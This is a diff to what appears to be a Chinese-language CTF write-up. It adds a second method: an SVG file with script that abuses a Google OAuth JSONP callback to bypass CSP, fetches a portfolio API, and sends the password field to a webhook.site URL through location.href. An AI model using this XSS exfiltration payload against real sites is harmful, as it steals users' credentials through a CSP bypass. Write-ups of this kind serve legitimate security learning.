@@ -307,6 +307,24 @@ fetch('/api/login', {
 </svg>
 ```
 
+方法2
+
+使用location.href 傳送flag (不受CSP限制)
+
+```
+<svg  width="400"
+  viewBox="0 0 400 300"
+  xmlns="http://www.w3.org/2000/svg"
+  xmlns:xlink="http://www.w3.org/1999/xlink">
+<script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio').then(function(a){return a.json()}).then(function(b){var aa = 'https://webhook.site/f25d50d9-9c87-4bce-8177-05a3360c5279/?flag='; aa= aa.concat(b.data.password);location.href=aa;})">
+</script>
+</svg>
+```
+
+需要修改report成那個svg
+
+![](https://i.imgur.com/s7MSif4.png)
+
 效果大概是這樣
 
 ![](https://i.imgur.com/OnBdVTc.png)
